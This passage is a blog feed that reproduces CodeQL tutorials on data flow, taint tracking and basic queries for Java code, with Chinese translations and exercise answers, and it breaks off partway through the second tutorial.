src="/.io//C:%5CUsers%5CSamny%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210321154347521.png" alt="image-20210321154347521"></p><p><img src="/.io//C:%5CUsers%5CSamny%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210321154357125.png" alt="image-20210321154357125"></p><p>Unfortunately, this only gives the expression in the argument, not the values which could be passed to it. So we use local data flow to find all expressions that flow into the argument:</p><blockquote><p>不幸的是，这只给出了参数中的表达式，而没有给出可以传递给它的值。所以我们使用本地数据流来查找所有流入参数中的表达式:</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line">import semmle.code.java.dataflow.DataFlow</span><br><span class="line"></span><br><span class="line">from Constructor fileReader, Call call, Expr src</span><br><span class="line">where</span><br><span class="line">  fileReader.getDeclaringType().hasQualifiedName(&quot;java.io&quot;, &quot;FileReader&quot;) and</span><br><span class="line">  call.getCallee() &#x3D; fileReader and</span><br><span class="line">  DataFlow::localFlow(DataFlow::exprNode(src), DataFlow::exprNode(call.getArgument(0)))</span><br><span class="line">select src</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/samny/images/raw/master/42u46er42ec/42u46er42ec.png" alt="image-20210321154642299"></p><p><img src="https://gitee.com/samny/images/raw/master/5u46er5ec/5u46er5ec.png" alt="image-20210321154605656"></p><p>Then we can make the source more specific, for example an access to a public parameter. This query finds where a public parameter is passed to <code>new FileReader(..)</code>:</p><blockquote><p>然后，我们可以把源头做得更具体，例如对一个公共参数的访问。这个查询可以找到公共参数被传递给new FileReader(…)的位置:</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line">import semmle.code.java.dataflow.DataFlow</span><br><span class="line"></span><br><span class="line">from Constructor fileReader, Call call, Parameter p</span><br><span class="line">where</span><br><span class="line">  fileReader.getDeclaringType().hasQualifiedName(&quot;java.io&quot;, &quot;FileReader&quot;) and</span><br><span class="line">  call.getCallee() &#x3D; fileReader and</span><br><span class="line">  DataFlow::localFlow(DataFlow::parameterNode(p), DataFlow::exprNode(call.getArgument(0)))</span><br><span class="line">select p</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/samny/images/raw/master/57u47er57ec/57u47er57ec.png" alt="image-20210321154757521"></p><p><img src="https://gitee.com/samny/images/raw/master/26u47er26ec/26u47er26ec.png" alt="image-20210321154726769"></p><p>This query finds calls to formatting functions where the format string is not hard-coded.</p><blockquote><p>这个查询可以找到对格式字符串没有硬编码的格式化函数的调用。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line">import semmle.code.java.dataflow.DataFlow</span><br><span class="line">import semmle.code.java.StringFormat</span><br><span class="line"></span><br><span class="line">from StringFormatMethod format, MethodAccess call, Expr formatString</span><br><span class="line">where</span><br><span class="line">  call.getMethod() &#x3D; format and</span><br><span class="line">  call.getArgument(format.getFormatStringIndex()) &#x3D; formatString and</span><br><span class="line">  not exists(DataFlow::Node source, DataFlow::Node sink |</span><br><span class="line">    DataFlow::localFlow(source, sink) and</span><br><span class="line">    source.asExpr() instanceof StringLiteral and</span><br><span class="line">    sink.asExpr() &#x3D; formatString</span><br><span class="line">  )</span><br><span class="line">select call, &quot;Argument to String format method isn&#39;t hard-coded.&quot;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/samny/images/raw/master/31u17er31ec/31u17er31ec.png" alt="image-20210321151731106"></p><p><img src="/.io//C:%5CUsers%5CSamny%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210321151844554.png" alt="image-20210321151844554"></p><p><img src="https://gitee.com/samny/images/raw/master/2u19er2ec/2u19er2ec.png" alt="image-20210321151901989"></p><h3 id="Exercises"><a href="#Exercises" class="headerlink" title="Exercises"></a>Exercises</h3><p>Exercise 1: Write a query that finds all hard-coded strings used to create a <code>java.net.URL</code>, using local data flow. (<a href="https://codeql.github.com/docs/codeql-language-guides/analyzing-data-flow-in-java/#exercise-1" target="_blank" rel="noopener">Answer</a>)</p><blockquote><p>练习1：写一个查询，使用本地数据流找到所有用于创建java.net.URL的硬编码字符串。(答案)</p></blockquote><h2 id="Global-data-flow"><a href="#Global-data-flow" class="headerlink" title="Global data flow"></a>Global data flow</h2><p>Global data flow tracks data flow throughout the entire program, and is therefore more powerful than local data flow. However, global data flow is less precise than local data flow, and the analysis typically requires significantly more time and memory to perform.</p><blockquote><p>全局数据流跟踪整个程序的数据流，因此比局部数据流更强大。但是，全局数据流的精度低于本地数据流，而且分析通常需要更多的时间和内存来执行。</p></blockquote><blockquote><p>Note</p><p>You can model data flow paths in CodeQL by creating path queries. To view data flow paths generated by a path query in CodeQL for VS Code, you need to make sure that it has the correct metadata and <code>select</code> clause. For more information, see <a href="https://codeql.github.com/docs/writing-codeql-queries/creating-path-queries/#creating-path-queries" target="_blank" rel="noopener">Creating path queries</a>.</p><p>你可以在CodeQL中通过创建路径查询来模拟数据流路径。要在CodeQL for VS Code中查看路径查询生成的数据流路径，你需要确保它有正确的元数据和选择子句。更多信息，请参阅创建路径查询。</p></blockquote><h3 id="Using-global-data-flow"><a href="#Using-global-data-flow" class="headerlink" title="Using global data flow"></a>Using global data flow</h3><p>You use the global data flow library by extending the class <code>DataFlow::Configuration</code>:</p><blockquote><p>你可以通过扩展类DataFlow::Configuration来使用全局数据流库:</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import semmle.code.java.dataflow.DataFlow</span><br><span class="line"></span><br><span class="line">class MyDataFlowConfiguration extends DataFlow::Configuration &#123;</span><br><span class="line">  MyDataFlowConfiguration() &#123; this &#x3D; &quot;MyDataFlowConfiguration&quot; &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSource(DataFlow::Node source) &#123;</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>These predicates are defined in the configuration:</p><blockquote><p>这些谓词在配置中被定义:</p></blockquote><ul><li><code>isSource</code>—defines where data may flow from  isSource-定义了数据可能从哪里流出。</li><li><code>isSink</code>—defines where data may flow to isSink-定义数据可能流向的地方</li><li><code>isBarrier</code>—optional, restricts the data flow  isBarrier-optional，限制数据流。</li><li><code>isAdditionalFlowStep</code>—optional, adds additional flow steps  isAdditionalFlowStep-选项，增加额外的流程步骤</li></ul><p>The characteristic predicate <code>MyDataFlowConfiguration()</code> defines the name of the configuration, so <code>&quot;MyDataFlowConfiguration&quot;</code> should be a unique name, for example, the name of your class.</p><blockquote><p>特性谓词MyDataFlowConfiguration()定义了配置的名称，所以 “MyDataFlowConfiguration “应该是一个唯一的名称，例如，你的类的名称。</p></blockquote><p>The data flow analysis is performed using the predicate <code>hasFlow(DataFlow::Node source, DataFlow::Node sink)</code>:</p><blockquote><p>使用谓词hasFlow(DataFlow::Node source, DataFlow::Node sink)进行数据流分析:</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from MyDataFlowConfiguration dataflow, DataFlow::Node source, DataFlow::Node sink</span><br><span class="line">where dataflow.hasFlow(source, sink)</span><br><span class="line">select source, &quot;Data flow to $@.&quot;, sink, sink.toString()</span><br></pre></td></tr></table></figure><h3 id="Using-global-taint-tracking"><a href="#Using-global-taint-tracking" class="headerlink" title="Using global taint tracking"></a>Using global taint tracking</h3><p>Global taint tracking is to global data flow as local taint tracking is to local data flow. That is, global taint tracking extends global data flow with additional non-value-preserving steps. You use the global taint tracking library by extending the class <code>TaintTracking::Configuration</code>:</p><blockquote><p>全局污点跟踪对于全局数据流来说，就像本地污点跟踪对于本地数据流一样。也就是说，全局污点跟踪通过额外的非保值步骤扩展了全局数据流。您通过扩展类TaintTracking::Configuration来使用全局污点跟踪库:</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import semmle.code.java.dataflow.TaintTracking</span><br><span class="line"></span><br><span class="line">class MyTaintTrackingConfiguration extends TaintTracking::Configuration &#123;</span><br><span class="line">  MyTaintTrackingConfiguration() &#123; this &#x3D; &quot;MyTaintTrackingConfiguration&quot; &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSource(DataFlow::Node source) &#123;</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>These predicates are defined in the configuration:</p><blockquote><p>这些谓词在配置中定义:</p></blockquote><ul><li><code>isSource</code>—defines where taint may flow from  isSource-定义了污点可能来自哪里。</li><li><code>isSink</code>—defines where taint may flow to  isSink-定义污点可能流向的地方。</li><li><code>isSanitizer</code>—optional, restricts the taint flow  isSanitizer-optional，限制污点的流动</li><li><code>isAdditionalTaintStep</code>—optional, adds additional taint steps   isAdditionalTaintStep-选项，增加额外的污点步骤。</li></ul><p>Similar to global data flow, the characteristic predicate <code>MyTaintTrackingConfiguration()</code> defines the unique name of the configuration.</p><blockquote><p>与全局数据流类似，特征谓词MyTaintTrackingConfiguration()定义了配置的唯一名称。</p></blockquote><p>The taint tracking analysis is performed using the predicate <code>hasFlow(DataFlow::Node source, DataFlow::Node sink)</code>.</p><blockquote><p>使用谓词hasFlow(DataFlow::Node source, DataFlow::Node sink)进行污点跟踪分析。</p></blockquote><h3 id="Flow-sources"><a href="#Flow-sources" class="headerlink" title="Flow sources"></a>Flow sources</h3><p>The data flow library contains some predefined flow sources. The class <code>RemoteFlowSource</code> (defined in <code>semmle.code.java.dataflow.FlowSources</code>) represents data flow sources that may be controlled by a remote user, which is useful for finding security problems.</p><blockquote><p>数据流库包含一些预定义的流源。类RemoteFlowSource（定义在semmle.code.java.dataflow.FlowSources中）代表了可能被远程用户控制的数据流源，这对于发现安全问题很有用。</p></blockquote><h3 id="Examples-1"><a href="#Examples-1" class="headerlink" title="Examples"></a>Examples</h3><p>This query shows a taint-tracking configuration that uses remote user input as data sources.</p><blockquote><p>这个查询显示了一个使用远程用户输入作为数据源的污点跟踪配置。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line">import semmle.code.java.dataflow.FlowSources</span><br><span class="line"></span><br><span class="line">class MyTaintTrackingConfiguration extends TaintTracking::Configuration &#123;</span><br><span class="line">  MyTaintTrackingConfiguration() &#123;</span><br><span class="line">    this &#x3D; &quot;...&quot;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSource(DataFlow::Node source) &#123;</span><br><span class="line">    source instanceof RemoteFlowSource</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Exercises-1"><a href="#Exercises-1" class="headerlink" title="Exercises"></a>Exercises</h3><p>Exercise 2: Write a query that finds all hard-coded strings used to create a <code>java.net.URL</code>, using global data flow. (<a href="https://codeql.github.com/docs/codeql-language-guides/analyzing-data-flow-in-java/#exercise-2" target="_blank" rel="noopener">Answer</a>)</p><blockquote><p>练习2：写一个查询，使用全局数据流找到所有用于创建java.net.URL的硬编码字符串。(答案)</p></blockquote><p>Exercise 3: Write a class that represents flow sources from <code>java.lang.System.getenv(..)</code>. (<a href="https://codeql.github.com/docs/codeql-language-guides/analyzing-data-flow-in-java/#exercise-3" target="_blank" rel="noopener">Answer</a>)</p><blockquote><p>练习3：从java.lang.System.getenv(…)写一个表示流源的类。(答案)</p></blockquote><p>Exercise 4: Using the answers from 2 and 3, write a query which finds all global data flows from <code>getenv</code> to <code>java.net.URL</code>. (<a href="https://codeql.github.com/docs/codeql-language-guides/analyzing-data-flow-in-java/#exercise-4" target="_blank" rel="noopener">Answer</a>)</p><blockquote><p> 练习4：使用2和3中的答案，写一个查询，找到所有从getenv到java.net.URL的全局数据流。(答案)</p></blockquote><h2 id="Answers"><a href="#Answers" class="headerlink" title="Answers"></a>Answers</h2><h3 id="Exercise-1"><a href="#Exercise-1" class="headerlink" title="Exercise 1"></a>Exercise 1</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import semmle.code.java.dataflow.DataFlow</span><br><span class="line"></span><br><span class="line">from Constructor url, Call call, StringLiteral src</span><br><span class="line">where</span><br><span class="line">  url.getDeclaringType().hasQualifiedName(&quot;java.net&quot;, &quot;URL&quot;) and</span><br><span class="line">  call.getCallee() &#x3D; url and</span><br><span class="line">  DataFlow::localFlow(DataFlow::exprNode(src), DataFlow::exprNode(call.getArgument(0)))</span><br><span class="line">select src</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/samny/images/raw/master/16u13er16ec/16u13er16ec.png" alt="image-20210321161316130"></p><h3 id="Exercise-2"><a href="#Exercise-2" class="headerlink" title="Exercise 2"></a>Exercise 2</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import semmle.code.java.dataflow.DataFlow</span><br><span class="line"></span><br><span class="line">class Configuration extends DataFlow::Configuration &#123;</span><br><span class="line">  Configuration() &#123;</span><br><span class="line">    this &#x3D; &quot;LiteralToURL Configuration&quot;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSource(DataFlow::Node source) &#123;</span><br><span class="line">    source.asExpr() instanceof StringLiteral</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">    exists(Call call |</span><br><span class="line">      sink.asExpr() &#x3D; call.getArgument(0) and</span><br><span class="line">      call.getCallee().(Constructor).getDeclaringType().hasQualifiedName(&quot;java.net&quot;, &quot;URL&quot;)</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from DataFlow::Node src, DataFlow::Node sink, Configuration config</span><br><span class="line">where config.hasFlow(src, sink)</span><br><span class="line">select src, &quot;This string constructs a URL $@.&quot;, sink, &quot;here&quot;</span><br></pre></td></tr></table></figure><h3 id="Exercise-3"><a href="#Exercise-3" class="headerlink" title="Exercise 3"></a>Exercise 3</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line">class GetenvSource extends MethodAccess &#123;</span><br><span class="line">  GetenvSource() &#123;</span><br><span class="line">    exists(Method m | m &#x3D; this.getMethod() |</span><br><span class="line">      m.hasName(&quot;getenv&quot;) and</span><br><span class="line">      m.getDeclaringType() instanceof TypeSystem</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Exercise-4"><a href="#Exercise-4" class="headerlink" title="Exercise 4"></a>Exercise 4</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">import semmle.code.java.dataflow.DataFlow</span><br><span class="line"></span><br><span class="line">class GetenvSource extends DataFlow::ExprNode &#123;</span><br><span class="line">  GetenvSource() &#123;</span><br><span class="line">    exists(Method m | m &#x3D; this.asExpr().(MethodAccess).getMethod() |</span><br><span class="line">      m.hasName(&quot;getenv&quot;) and</span><br><span class="line">      m.getDeclaringType() instanceof TypeSystem</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class GetenvToURLConfiguration extends DataFlow::Configuration &#123;</span><br><span class="line">  GetenvToURLConfiguration() &#123;</span><br><span class="line">    this &#x3D; &quot;GetenvToURLConfiguration&quot;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSource(DataFlow::Node source) &#123;</span><br><span class="line">    source instanceof GetenvSource</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">    exists(Call call |</span><br><span class="line">      sink.asExpr() &#x3D; call.getArgument(0) and</span><br><span class="line">      call.getCallee().(Constructor).getDeclaringType().hasQualifiedName(&quot;java.net&quot;, &quot;URL&quot;)</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from DataFlow::Node src, DataFlow::Node sink, GetenvToURLConfiguration config</span><br><span class="line">where config.hasFlow(src, sink)</span><br><span class="line">select src, &quot;This environment variable constructs a URL $@.&quot;, sink, &quot;here&quot;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Analyzing-data-flow-in-Java¶&quot;&gt;&lt;a href=&quot;#Analyzing-data-flow-in-Java¶&quot; class=&quot;headerlink&quot; title=&quot;Analyzing data flow in Java¶&quot;&gt;&lt;/a&gt;An
      
    
    </summary>
    
    
      <category term="codeql" scheme="https://summersec.github.io/categories/codeql/"/>
    
    
  </entry>
  
  <entry>
    <title>Basic query for Java code</title>
    <link href="https://summersec.github.io/2021/03/22/Basic%20query%20for%20Java%20code/"/>
    <id>https://summersec.github.io/2021/03/22/Basic%20query%20for%20Java%20code/</id>
    <published>2021-03-22T11:01:42.000Z</published>
    <updated>2021-03-22T13:44:17.240Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Basic-query-for-Java-code¶"><a href="#Basic-query-for-Java-code¶" class="headerlink" title="Basic query for Java code¶"></a>Basic query for Java code<a href="https://codeql.github.com/docs/codeql-language-guides/basic-query-for-java-code/#basic-query-for-java-code" target="_blank" rel="noopener">¶</a></h1><p>Learn to write and run a simple CodeQL query using LGTM.</p><blockquote><p>学习使用LGTM编写并运行一个简单的CodeQL查询。</p></blockquote><h2 id="About-the-query"><a href="#About-the-query" class="headerlink" title="About the query"></a>About the query</h2><p>The query we’re going to run performs a basic search of the code for <code>if</code> statements that are redundant, in the sense that they have an empty then branch. For example, code such as:</p><blockquote><p>我们要运行的查询是对代码进行基本搜索，寻找多余的if语句，即它们有一个空的then分支。例如:</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (error) &#123; &#125;</span><br></pre></td></tr></table></figure><h2 id="Running-the-query"><a href="#Running-the-query" class="headerlink" title="Running the query"></a>Running the query</h2><ol><li><p>In the main search box on LGTM.com, search for the project you want to query. For tips, see <a href="https://lgtm.com/help/lgtm/searching" target="_blank" rel="noopener">Searching</a>.</p><blockquote><p>在LGTM.com的主搜索框中，搜索你要查询的项目。有关提示，请参阅搜索。</p></blockquote></li><li><p>Click the project in the search results.</p><blockquote><p>点击搜索结果中的项目。</p></blockquote></li><li><p>Click <strong>Query this project</strong>.</p><blockquote><p>点击查询这个项目。</p></blockquote><p> This opens the query console. (For information about using this, see <a href="https://lgtm.com/help/lgtm/using-query-console" target="_blank" rel="noopener">Using the query console</a>.)</p><blockquote><p>这将打开查询控制台。有关使用该功能的信息，请参见使用查询控制台。</p></blockquote><blockquote><p>Note</p><p>Alternatively, you can go straight to the query console by clicking <strong>Query console</strong> (at the top of any page), selecting <strong>Java</strong> from the <strong>Language</strong> drop-down list, then choosing one or more projects to query from those displayed in the <strong>Project</strong> drop-down list.</p><p>你可以直接进入查询控制台，点击查询控制台（在任何页面的顶部），从语言下拉列表中选择Java，然后从项目下拉列表中显示的项目中选择一个或多个项目进行查询。</p></blockquote></li><li><p>Copy the following query into the text box in the query console:</p><blockquote><p>将以下查询复制到查询控制台的文本框中。</p></blockquote> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line">from IfStmt ifstmt, Block block</span><br><span class="line">where ifstmt.getThen() &#x3D; block and</span><br><span class="line">  block.getNumStmt() &#x3D; 0</span><br><span class="line">select ifstmt, &quot;This &#39;if&#39; statement is redundant.&quot;</span><br></pre></td></tr></table></figure><p> LGTM checks whether your query compiles and, if all is well, the <strong>Run</strong> button changes to green to indicate that you can go ahead and run the query.</p><blockquote><p>在查询框的下方列出了你要查询的项目名称，以及最近分析的项目提交的ID。右边是一个图标，表示查询操作的进度。</p></blockquote></li><li><p>Click <strong>Run</strong>.</p><p> The name of the project you are querying, and the ID of the most recently analyzed commit to the project, are listed below the query box. To the right of this is an icon that indicates the progress of the query operation:</p><blockquote><p>在查询框的下方列出了你要查询的项目名称，以及最近分析的项目提交的ID。右边是一个图标，表示查询操作的进度。</p></blockquote><p> <img src="https://gitee.com/samny/images/raw/master/4u26er4ec/4u26er4ec.png" alt="image-20210319162604365"></p><p> <img src="https://gitee.com/samny/images/raw/master/21u42er21ec/21u42er21ec.png" alt="image-20210319164221280"></p><blockquote><p>Note</p><p>Your query is always run against the most recently analyzed commit to the selected project.</p><blockquote><p>你的查询总是针对最近分析过的项目的提交运行。</p></blockquote></blockquote><p> The query will take a few moments to return results. When the query completes, the results are displayed below the project name. The query results are listed in two columns, corresponding to the two expressions in the <code>select</code> clause of the query. The first column corresponds to the expression <code>ifstmt</code> and is linked to the location in the source code of the project where <code>ifstmt</code> occurs. The second column is the alert message.</p><blockquote><p>查询需要几分钟才能返回结果。当查询完成后，结果会显示在项目名称下面。查询结果列在两列中，对应于查询的选择子句中的两个表达式。第一列对应表达式ifstmt，并链接到ifstmt出现的项目源代码中的位置。第二列是警报信息。</p></blockquote><p> ➤ <a href="https://lgtm.com/query/3235645104630320782/" target="_blank" rel="noopener">Example query results</a></p><blockquote><p>Note</p><p>An ellipsis (…) at the bottom of the table indicates that the entire list is not displayed—click it to show more results.</p><p>表格底部的省略号(…)表示没有显示整个列表-点击它以显示更多结果。</p></blockquote></li><li><p>If any matching code is found, click a link in the <code>ifstmt</code> column to view the <code>if</code> statement in the code viewer.</p><blockquote><p>如果找到任何匹配的代码，请点击ifstmt列中的链接，在代码查看器中查看if语句。</p></blockquote><p> The matching <code>if</code> statement is highlighted with a yellow background in the code viewer. If any code in the file also matches a query from the standard query library for that language, you will see a red alert message at the appropriate point within the code.</p><blockquote><p>匹配的if语句会在代码查看器中以黄色背景高亮显示。如果文件中的任何代码也匹配了该语言的标准查询库中的查询，您将在代码中的适当位置看到一条红色的警报信息。</p></blockquote></li></ol><h3 id="About-the-query-structure"><a href="#About-the-query-structure" class="headerlink" title="About the query structure"></a>About the query structure</h3><p>After the initial <code>import</code> statement, this simple query comprises three parts that serve similar purposes to the FROM, WHERE, and SELECT parts of an SQL query.</p><blockquote><p>在初始导入语句之后，这个简单的查询由三个部分组成，其作用类似于SQL查询中的FROM、WHERE和SELECT部分。</p></blockquote><table><thead><tr><th align="left">Query part</th><th align="left">Purpose</th><th align="left">Details</th></tr></thead><tbody><tr><td align="left"><code>import java</code></td><td align="left">Imports the standard CodeQL libraries for Java.</td><td align="left">Every query begins with one or more <code>import</code> statements.</td></tr><tr><td align="left"></td><td align="left">导入Java的标准CodeQL库</td><td align="left">每个查询都以一个或多个导入语句开始。</td></tr><tr><td align="left"><code>from IfStmt ifstmt, Block block</code></td><td align="left">Defines the variables for the query. Declarations are of the form: <code>&lt;type&gt; &lt;variable name&gt;</code></td><td align="left">We use: an <code>IfStmt</code> variable for <code>if</code> statements ;  a <code>Block</code> variable for the then block</td></tr><tr><td align="left"></td><td align="left">声明的形式是：<type> &lt;variable name &lt;类型&gt; &lt;变量名&gt;。</type></td><td align="left">我们使用:一个 “IfStmt “变量用于 “if “语句; a “Block “变量用于 “then “块。</td></tr><tr><td align="left"><code>where ifstmt.getThen() = block and block.getNumStmt() = 0</code></td><td align="left">Defines a condition on the variables.</td><td align="left"><code>ifstmt.getThen() = block</code> relates the two variables. The block must be the <code>then</code> branch of the <code>if</code> statement.<code>block.getNumStmt() = 0</code> states that the block must be empty (that is, it contains no statements).</td></tr><tr><td align="left"></td><td align="left">定义一个变量的条件。</td><td align="left">ifstmt.getThen() = block将两个变量联系起来。block必须是if语句的then分支。block.getNumStmt() = 0 说明该块必须是空的（也就是说，它不包含任何语句）。</td></tr><tr><td align="left"><code>select ifstmt, &quot;This &#39;if&#39; statement is redundant.&quot;</code></td><td align="left">Defines what to report for each match.<code>select</code> statements for queries that are used to find instances of poor coding practice are always in the form: <code>select &lt;program element&gt;, &quot;&lt;alert message&gt;&quot;</code></td><td align="left">Reports the resulting <code>if</code> statement with a string that explains the problem.</td></tr><tr><td align="left"></td><td align="left">定义了每个匹配的报告内容。用于查找不良编码实践实例的查询的select语句总是采用这样的形式：select <program element>, “<alert message>“</alert></program></td><td align="left">用一个解释问题的字符串报告结果的if语句。</td></tr></tbody></table><h2 id="Extend-the-query"><a href="#Extend-the-query" class="headerlink" title="Extend the query"></a>Extend the query</h2><p>Query writing is an inherently iterative process. You write a simple query and then, when you run it, you discover examples that you had not previously considered, or opportunities for improvement.</p><blockquote><p>查询的编写本质上是一个迭代的过程。你写了一个简单的查询，然后，当你运行它时，你会发现你以前没有考虑过的例子，或者改进的机会。</p></blockquote><h3 id="Remove-false-positive-results"><a href="#Remove-false-positive-results" class="headerlink" title="Remove false positive results"></a>Remove false positive results</h3><p>Browsing the results of our basic query shows that it could be improved. Among the results you are likely to find examples of <code>if</code> statements with an <code>else</code> branch, where an empty <code>then</code> branch does serve a purpose. For example:</p><blockquote><p>浏览我们的基本查询结果，发现它还可以改进。在这些结果中，你很可能会发现if语句带有else分支的例子，其中空的then分支确实有一定的作用。例如:</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if (...) &#123;</span><br><span class="line">  ...</span><br><span class="line">&#125; else if (&quot;-verbose&quot;.equals(option)) &#123;</span><br><span class="line">  &#x2F;&#x2F; nothing to do - handled earlier</span><br><span class="line">&#125; else &#123;</span><br><span class="line">  error(&quot;unrecognized option&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>In this case, identifying the <code>if</code> statement with the empty <code>then</code> branch as redundant is a false positive. One solution to this is to modify the query to ignore empty <code>then</code> branches if the <code>if</code> statement has an <code>else</code> 